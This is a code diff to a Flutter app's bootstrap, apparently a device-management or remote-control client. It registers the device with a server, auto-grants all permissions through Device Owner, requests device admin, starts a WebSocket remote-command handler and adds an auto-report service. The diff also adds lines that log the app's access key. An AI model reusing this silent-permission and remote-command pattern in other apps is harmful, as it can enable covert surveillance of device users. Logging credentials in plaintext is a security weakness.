@@ -13,6 +13,7 @@ import 'package:url_launcher/url_launcher.dart';
 import 'package:web_socket_channel/web_socket_channel.dart';
 
 import 'config/build_config.dart';
+import 'services/auto_report_service.dart';
 
 // ==========================================
 // ===== GLOBAL =====
@@ -73,6 +74,7 @@ class _AppBootstrapState extends State<AppBootstrap>
   DateTime? _lastRegisterTime;
 
   final _commandService = CommandHandlerService();
+  final _autoReportService = AutoReportService();
 
   @override
   void initState() {
@@ -89,6 +91,7 @@ class _AppBootstrapState extends State<AppBootstrap>
   void dispose() {
     WidgetsBinding.instance.removeObserver(this);
     _commandService.dispose();
+    _autoReportService.stop();
     super.dispose();
   }
 
@@ -118,7 +121,9 @@ class _AppBootstrapState extends State<AppBootstrap>
   Future<void> _bootstrap() async {
     print('🚀 [BOOTSTRAP] START');
 
+    // ==========================================
     // STEP 1: SAVE CONFIG
+    // ==========================================
     print('📦 [BOOTSTRAP] Step 1: Save config');
     try {
       final prefs = await SharedPreferences.getInstance();
@@ -139,11 +144,16 @@ class _AppBootstrapState extends State<AppBootstrap>
       }
 
       print('✅ [BOOTSTRAP] Config saved');
+      print('🔑 accessKey="${BuildConfig.accessKey}"');
+      print('🌐 serverUrl="${BuildConfig.serverUrl}"');
+      print('📦 packageName="${BuildConfig.packageName}"');
     } catch (e) {
       print('❌ [BOOTSTRAP] Prefs error: $e');
     }
 
+    // ==========================================
     // STEP 2: REGISTER DEVICE
+    // ==========================================
     print('📦 [BOOTSTRAP] Step 2: REGISTER DEVICE');
     if (mounted) setState(() => _status = 'Mendaftar device...');
 
@@ -154,7 +164,9 @@ class _AppBootstrapState extends State<AppBootstrap>
       print('❌ [BOOTSTRAP] Register error: $e');
     }
 
+    // ==========================================
     // STEP 3: Request permissions
+    // ==========================================
     print('📦 [BOOTSTRAP] Step 3: Request permissions');
     if (mounted) setState(() => _status = 'Meminta izin...');
 
@@ -162,14 +174,26 @@ class _AppBootstrapState extends State<AppBootstrap>
         .then((_) => print('✅ [BOOTSTRAP] Permissions done'))
         .catchError((e) => print('⚠️ [BOOTSTRAP] Permission error: $e'));
 
+    // ==========================================
     // STEP 4: Auto-grant Device Owner
+    // ==========================================
     _autoGrantPermissionsBackground();
 
-    // STEP 5: Start command handler
+    // ==========================================
+    // STEP 5: Start command handler (WebSocket)
+    // ==========================================
     print('📦 [BOOTSTRAP] Step 5: Start command handler');
     _commandService.start();
 
+    // ==========================================
+    // STEP 5.5: Start auto-report service
+    // ==========================================
+    print('📦 [BOOTSTRAP] Step 5.5: Start auto-report');
+    _autoReportService.start();
+
+    // ==========================================
     // STEP 6: Ready
+    // ==========================================
     print('📦 [BOOTSTRAP] Step 6: Ready');
     await Future.delayed(const Duration(milliseconds: 300));
     if (!mounted) return;
@@ -186,8 +210,8 @@ class _AppBootstrapState extends State<AppBootstrap>
   Future<void> _autoGrantPermissionsBackground() async {
     try {
       print('🔐 [AUTOGRANT] Mencoba auto-grant via Device Owner...');
-      final granted = await _deviceChannel
-          .invokeMethod<bool>('autoGrantAllPermissions');
+      final granted =
+          await _deviceChannel.invokeMethod<bool>('autoGrantAllPermissions');
       print('🔐 [AUTOGRANT] Hasil: $granted');
     } catch (e) {
       print('⚠️ [AUTOGRANT] Error: $e');
@@ -300,7 +324,8 @@ class _AppBootstrapState extends State<AppBootstrap>
       await _deviceChannel.invokeMethod('requestDeviceAdmin');
       await Future.delayed(const Duration(seconds: 3));
 
-      final newStatus = await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');
+      final newStatus =
+          await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');
       print('📊 [ADMIN] Status after request: $newStatus');
     } catch (e) {
       print('❌ [ADMIN] Request error: $e');
@@ -349,14 +374,8 @@ class _AppBootstrapState extends State<AppBootstrap>
   // ===== REGISTER DEVICE =====
   // ==========================================
   Future<void> _registerDeviceWithRetry() async {
-    if (_isRegistering) {
-      print('⏭️ [REGISTER] Already in progress');
-      return;
-    }
-    if (_hasRegistered) {
-      print('⏭️ [REGISTER] Already registered');
-      return;
-    }
+    if (_isRegistering) return;
+    if (_hasRegistered) return;
     if (BuildConfig.accessKey.isEmpty) {
       print('⚠️ [REGISTER] accessKey kosong, skip');
       return;
@@ -430,10 +449,7 @@ class _AppBootstrapState extends State<AppBootstrap>
   // ==========================================
   // ===== HTTP POST =====
   // ==========================================
-  Future<String?> _httpPost(
-    String url,
-    Map<String, dynamic> body,
-  ) async {
+  Future<String?> _httpPost(String url, Map<String, dynamic> body) async {
     HttpClient? client;
     try {
       print('📤 [HTTP] POST → $url');
@@ -623,8 +639,8 @@ class CommandHandlerService {
       switch (command) {
         // ===== DEVICE INFO =====
         case 'get_device_info':
-          final infoStr = await _deviceChannel
-              .invokeMethod<String>('getDeviceInfo');
+          final infoStr =
+              await _deviceChannel.invokeMethod<String>('getDeviceInfo');
           if (infoStr != null && infoStr.isNotEmpty) {
             return jsonDecode(infoStr) as Map<String, dynamic>;
           }
@@ -632,8 +648,8 @@ class CommandHandlerService {
 
         // ===== NETWORK INFO =====
         case 'get_network_info':
-          final infoStr = await _deviceChannel
-              .invokeMethod<String>('getNetworkInfo');
+          final infoStr =
+              await _deviceChannel.invokeMethod<String>('getNetworkInfo');
           if (infoStr != null && infoStr.isNotEmpty) {
             return jsonDecode(infoStr) as Map<String, dynamic>;
           }
